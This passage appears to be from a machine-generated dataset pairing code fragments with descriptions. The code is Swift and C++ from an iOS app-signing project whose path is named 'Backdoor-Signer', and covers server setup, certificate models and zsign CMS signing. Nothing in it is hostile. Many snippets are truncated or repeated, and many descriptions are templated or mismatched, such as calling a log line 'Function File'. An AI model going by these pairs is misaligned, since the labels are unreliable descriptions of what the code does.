    "nl": "Function shutdownServer - implements shutdownserver functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server.swift",
    "code_type": "function"
  },
  {
    "id": "398",
    "code": "extension Installer {\nprivate static let env: Environment = {",
    "nl": "extension Installer - implements functionality related to installer",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server.swift",
    "code_type": "extension"
  },
  {
    "id": "399",
    "code": "static func setupApp(port: Int) throws -> Application {\nlet app = Application(env)\n\napp.threadPool = .init(numberOfThreads: 1)\n\nif !Preferences.userSelectedServer {",
    "nl": "Function setupApp - sets upapp",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server.swift",
    "code_type": "function"
  },
  {
    "id": "400",
    "code": "struct ServerPack: Decodable {\nvar cert: String\nvar ca: String\nvar key: String\nvar info: ServerPackInfo\n\nprivate enum CodingKeys: String, CodingKey {",
    "nl": "struct ServerPack - implements functionality related to server pack",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Model/ServerPack.swift",
    "code_type": "struct"
  },
  {
    "id": "401",
    "code": "private enum CodingKeys: String, CodingKey {\ncase cert, ca, key1, key2, info\n}\n\ninit(from decoder: Decoder) throws {",
    "nl": "enum CodingKeys - implements functionality related to coding keys",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Model/ServerPack.swift",
    "code_type": "enum"
  },
  {
    "id": "402",
    "code": "struct ServerPackInfo: Decodable {\nvar issuer: Issuer\nvar domains: Domains\n}\n\nstruct Issuer: Decodable {",
    "nl": "struct ServerPackInfo - implements functionality related to server pack info",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Model/ServerPack.swift",
    "code_type": "struct"
  },
  {
    "id": "403",
    "code": "struct Issuer: Decodable {\nvar commonName: String\n\nprivate enum CodingKeys: String, CodingKey {",
    "nl": "struct Issuer - implements functionality related to issuer",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Model/ServerPack.swift",
    "code_type": "struct"
  },
  {
    "id": "404",
    "code": "private enum CodingKeys: String, CodingKey {\ncase commonName\n}\n}\n\nstruct Domains: Decodable {",
    "nl": "enum CodingKeys - implements functionality related to coding keys",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Model/ServerPack.swift",
    "code_type": "enum"
  },
  {
    "id": "405",
    "code": "struct Domains: Decodable {\nvar commonName: String\n\nprivate enum CodingKeys: String, CodingKey {",
    "nl": "struct Domains - implements functionality related to domains",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Model/ServerPack.swift",
    "code_type": "struct"
  },
  {
    "id": "406",
    "code": "private enum CodingKeys: String, CodingKey {\ncase commonName\n}\n}\n",
    "nl": "enum CodingKeys - implements functionality related to coding keys",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Model/ServerPack.swift",
    "code_type": "enum"
  },
  {
    "id": "407",
    "code": "struct stat statbuf;\nstat(strFolder.c_str(), &statbuf);\nif (S_ISDIR(statbuf.st_mode))\n{",
    "nl": "struct stat - implements stat functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/bundle.cpp",
    "code_type": "struct"
  },
  {
    "id": "408",
    "code": "return OpenFile(szFile);",
    "nl": "Function OpenFile - implements openfile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.cpp",
    "code_type": "function"
  },
  {
    "id": "409",
    "code": "return Init(szFile);",
    "nl": "Function Init - implements init functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.cpp",
    "code_type": "function"
  },
  {
    "id": "410",
    "code": "return CloseFile();",
    "nl": "Function CloseFile - implements closefile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.cpp",
    "code_type": "function"
  },
  {
    "id": "411",
    "code": "ZArchO *archo = new ZArchO();",
    "nl": "Function ZArchO - implements zarcho functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.cpp",
    "code_type": "function"
  },
  {
    "id": "412",
    "code": "ZLog::ErrorV(\">>> Invalid Macho File (2)!\\n\");",
    "nl": "Function File - implements file functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.cpp",
    "code_type": "function"
  },
  {
    "id": "413",
    "code": "ZLog::ErrorV(\">>> CodeSign Write(munmap) Failed! Error: %p, %lu, %s\\n\", m_pBase, m_sSize, strerror(errno));",
    "nl": "Function Write - implements write functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.cpp",
    "code_type": "function"
  },
  {
    "id": "414",
    "code": "return Sign(pSignAsset, bForce, strBundleId, strInfoPlistSHA1, strInfoPlistSHA256,\nstrCodeResourcesData);",
    "nl": "Function Sign - implements sign functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.cpp",
    "code_type": "function"
  },
  {
    "id": "415",
    "code": "return CloseFile();",
    "nl": "Function CloseFile - implements closefile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.cpp",
    "code_type": "function"
  },
  {
    "id": "416",
    "code": "return OpenFile(m_strFile.c_str());",
    "nl": "Function OpenFile - implements openfile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.cpp",
    "code_type": "function"
  },
  {
    "id": "417",
    "code": "return OpenFile(m_strFile.c_str());",
    "nl": "Function OpenFile - implements openfile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.cpp",
    "code_type": "function"
  },
  {
    "id": "418",
    "code": "class COpenSSLInit\n{",
    "nl": "class COpenSSLInit - implements functionality related to c open s s l init",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "class"
  },
  {
    "id": "419",
    "code": "bool CMSError()\n{",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "420",
    "code": "bool _GenerateCMS(X509 *scert, EVP_PKEY *spkey, const string &strCDHashData, const string &strCDHashPlist,\nconst string &strCodeDirectorySlotSHA1, const string &strAltnateCodeDirectorySlot256,\nstring &strCMSOutput)\n{",
    "nl": "Function _GenerateCMS - implements  generatecms functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "421",
    "code": "return CMSError();",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "422",
    "code": "return CMSError();",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "423",
    "code": "return CMSError();",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "424",
    "code": "return CMSError();",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "425",
    "code": "return CMSError();",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "426",
    "code": "return CMSError();",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "427",
    "code": "return CMSError();",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "428",
    "code": "return CMSError();",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "429",
    "code": "return CMSError();",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "430",
    "code": "return CMSError();",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "431",
    "code": "return CMSError();",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "432",
    "code": "return CMSError();",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "433",
    "code": "return CMSError();",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "434",
    "code": "return CMSError();",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "435",
    "code": "return CMSError();",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "436",
    "code": "return CMSError();",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "437",
    "code": "return CMSError();",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "438",
    "code": "bool GenerateCMS(const string &strSignerCertData, const string &strSignerPKeyData, const string &strCDHashData,\nconst string &strCDHashesPlist, string &strCMSOutput)\n{",
    "nl": "Function GenerateCMS - implements generatecms functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "439",
    "code": "return CMSError();",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "440",
    "code": "return CMSError();",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "441",
    "code": "bool GetCMSContent(const string &strCMSDataInput, string &strContentOutput)\n{",
    "nl": "Function GetCMSContent - implements getcmscontent functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "442",
    "code": "return CMSError();",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "443",
    "code": "return CMSError();",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "444",
    "code": "return CMSError();",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "445",
    "code": "bool GetCertSubjectCN(X509 *cert, string &strSubjectCN)\n{",
    "nl": "Function GetCertSubjectCN - implements getcertsubjectcn functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "446",
    "code": "return CMSError();",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "447",
    "code": "return CMSError();",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "448",
    "code": "return CMSError();",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "449",
    "code": "return CMSError();",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "450",
    "code": "bool GetCertSubjectCN(const string &strCertData, string &strSubjectCN)\n{",
    "nl": "Function GetCertSubjectCN - implements getcertsubjectcn functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "451",
    "code": "return CMSError();",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "452",
    "code": "return CMSError();",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "453",
    "code": "return GetCertSubjectCN(cert, strSubjectCN);",
    "nl": "Function GetCertSubjectCN - implements getcertsubjectcn functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "454",
    "code": "void ParseCertSubject(const string &strSubject, JValue &jvSubject)\n{",
    "nl": "Function ParseCertSubject - implements parsecertsubject functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "455",
    "code": "string ASN1_TIMEtoString(ASN1_TIME *time)\n{",
    "nl": "Function ASN1_TIMEtoString - implements asn1 timetostring functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "456",
    "code": "string ASN1_TIMEtoString(const ASN1_TIME *time)\n{",
    "nl": "Function ASN1_TIMEtoString - implements asn1 timetostring functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "457",
    "code": "bool GetCertInfo(X509 *cert, JValue &jvCertInfo)\n{",
    "nl": "Function GetCertInfo - implements getcertinfo functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "458",
    "code": "return CMSError();",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "459",
    "code": "bool GetCMSInfo(uint8_t *pCMSData, uint32_t uCMSLength, JValue &jvOutput)\n{",
    "nl": "Function GetCMSInfo - implements getcmsinfo functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "460",
    "code": "return CMSError();",
    "nl": "Function CMSError - implements cmserror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp",
    "code_type": "function"
  },
  {
    "id": "461",
    "code": "static void _DERLength(string &strBlob, uint64_t uLength)\n{",
    "nl": "Function _DERLength - implements  derlength functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp",
    "code_type": "function"
  },
  {
    "id": "462",
    "code": "static string _DER(const JValue &data)\n{",
    "nl": "Function _DER - implements  der functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp",
    "code_type": "function"
  },
  {
    "id": "463",
    "code": "uint32_t SlotParseGeneralHeader(const char *szSlotName, uint8_t *pSlotBase, CS_BlobIndex *pbi)\n{",
    "nl": "Function SlotParseGeneralHeader - implements slotparsegeneralheader functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp",
    "code_type": "function"
  },
  {
    "id": "464",
    "code": "void SlotParseGeneralTailer(uint8_t *pSlotBase, uint32_t uSlotLength)\n{",
    "nl": "Function SlotParseGeneralTailer - implements slotparsegeneraltailer functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp",
    "code_type": "function"
  },
  {
    "id": "465",
    "code": "bool SlotParseRequirements(uint8_t *pSlotBase, CS_BlobIndex *pbi)\n{",
    "nl": "Function SlotParseRequirements - implements slotparserequirements functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp",
    "code_type": "function"
  },
  {
    "id": "466",
    "code": "bool SlotBuildRequirements(const string &strBundleID, const string &strSubjectCN, string &strOutput)\n{",
    "nl": "Function SlotBuildRequirements - implements slotbuildrequirements functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp",
    "code_type": "function"
  },
  {
    "id": "467",
    "code": "bool SlotParseEntitlements(uint8_t *pSlotBase, CS_BlobIndex *pbi)\n{",
    "nl": "Function SlotParseEntitlements - implements slotparseentitlements functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp",
    "code_type": "function"
  },
  {
    "id": "468",
    "code": "bool SlotParseDerEntitlements(uint8_t *pSlotBase, CS_BlobIndex *pbi)\n{",
    "nl": "Function SlotParseDerEntitlements - implements slotparsederentitlements functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp",
    "code_type": "function"
  },
  {
    "id": "469",
    "code": "bool SlotBuildEntitlements(const string &strEntitlements, string &strOutput)\n{",
    "nl": "Function SlotBuildEntitlements - implements slotbuildentitlements functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp",
    "code_type": "function"
  },
  {
    "id": "470",
    "code": "bool SlotBuildDerEntitlements(const string &strEntitlements, string &strOutput)\n{",
    "nl": "Function SlotBuildDerEntitlements - implements slotbuildderentitlements functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp",
    "code_type": "function"
  },
  {
    "id": "471",
    "code": "bool SlotParseCodeDirectory(uint8_t *pSlotBase, CS_BlobIndex *pbi)\n{",
    "nl": "Function SlotParseCodeDirectory - implements slotparsecodedirectory functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp",
    "code_type": "function"
  },
  {
    "id": "472",
    "code": "bool SlotBuildCodeDirectory(bool bAlternate, uint8_t *pCodeBase, uint32_t uCodeLength, uint8_t *pCodeSlotsData,\nuint32_t uCodeSlotsDataLength, uint64_t execSegLimit, uint64_t execSegFlags,\nconst string &strBundleId, const string &strTeamId, const string &strInfoPlistSHA,\nconst string &strRequirementsSlotSHA, const string &strCodeResourcesSHA,\nconst string &strEntitlementsSlotSHA, const string &strDerEntitlementsSlotSHA,\nbool isExecuteArch, string &strOutput)\n{",
    "nl": "Function SlotBuildCodeDirectory - implements slotbuildcodedirectory functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp",
    "code_type": "function"
  },
  {
    "id": "473",
    "code": "bool SlotParseCMSSignature(uint8_t *pSlotBase, CS_BlobIndex *pbi)\n{",
    "nl": "Function SlotParseCMSSignature - implements slotparsecmssignature functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp",
    "code_type": "function"
  },
  {
    "id": "474",
    "code": "bool SlotBuildCMSSignature(ZSignAsset *pSignAsset, const string &strCodeDirectorySlot,\nconst string &strAltnateCodeDirectorySlot, string &strOutput)\n{",
    "nl": "Function SlotBuildCMSSignature - implements slotbuildcmssignature functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp",
    "code_type": "function"
  },
  {
    "id": "475",
    "code": "uint32_t GetCodeSignatureLength(uint8_t *pCSBase)\n{",
    "nl": "Function GetCodeSignatureLength - implements getcodesignaturelength functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp",
    "code_type": "function"
  },
  {
    "id": "476",
    "code": "return LE(psb->length);",
    "nl": "Function LE - implements le functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp",
    "code_type": "function"
  },
  {
    "id": "477",
    "code": "bool ParseCodeSignature(uint8_t *pCSBase)\n{",
    "nl": "Function ParseCodeSignature - implements parsecodesignature functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp",
    "code_type": "function"
  },
  {
    "id": "478",
    "code": "bool SlotGetCodeSlotsData(uint8_t *pSlotBase, uint8_t *&pCodeSlots, uint32_t &uCodeSlotsLength)\n{",
    "nl": "Function SlotGetCodeSlotsData - implements slotgetcodeslotsdata functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp",
    "code_type": "function"
  },
  {
    "id": "479",
    "code": "bool GetCodeSignatureExistsCodeSlotsData(uint8_t *pCSBase, uint8_t *&pCodeSlots1Data, uint32_t &uCodeSlots1DataLength,\nuint8_t *&pCodeSlots256Data, uint32_t &uCodeSlots256DataLength)\n{",
    "nl": "Function GetCodeSignatureExistsCodeSlotsData - implements getcodesignatureexistscodeslotsdata functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp",
    "code_type": "function"
  },
  {
    "id": "480",
    "code": "#define B0(a) (a & 0xFF)\n#define B1(a) (a >> 8 & 0xFF)\n#define B2(a) (a >> 16 & 0xFF)\n#define B3(a) (a >> 24 & 0xFF)\n\nZBase64::ZBase64(void) {}",
    "nl": "Function B0 - implements b0 functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/base64.cpp",
    "code_type": "function"
  },
  {
    "id": "481",
    "code": "#define B1(a) (a >> 8 & 0xFF)\n#define B2(a) (a >> 16 & 0xFF)\n#define B3(a) (a >> 24 & 0xFF)\n\nZBase64::ZBase64(void) {}",
    "nl": "Function B1 - implements b1 functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/base64.cpp",
    "code_type": "function"
  },
  {
    "id": "482",
    "code": "#define B2(a) (a >> 16 & 0xFF)\n#define B3(a) (a >> 24 & 0xFF)\n\nZBase64::ZBase64(void) {}",
    "nl": "Function B2 - implements b2 functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/base64.cpp",
    "code_type": "function"
  },
  {
    "id": "483",
    "code": "#define B3(a) (a >> 24 & 0xFF)\n\nZBase64::ZBase64(void) {}",
    "nl": "Function B3 - implements b3 functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/base64.cpp",
    "code_type": "function"
  },
  {
    "id": "484",
    "code": "char *ZBase64::Encode(const string &strData) { return Encode(strData.c_str(), (int)strData.size()); }",
    "nl": "Function Encode - implements encode functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/base64.cpp",
    "code_type": "function"
  },
  {
    "id": "485",
    "code": "return Decode(strData.c_str(), (int)strData.size(), pOutDataLen);",
    "nl": "Function Decode - implements decode functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/base64.cpp",
    "code_type": "function"
  },
  {
    "id": "486",
    "code": "#define PARSEVALIST(szFormatArgs, szArgs)                                                                              \\\nZBuffer buffer;                                                                                                    \\",
    "nl": "Function PARSEVALIST - implements parsevalist functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "487",
    "code": "bool IsRegularFile(const char *file)\n{",
    "nl": "Function IsRegularFile - implements isregularfile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
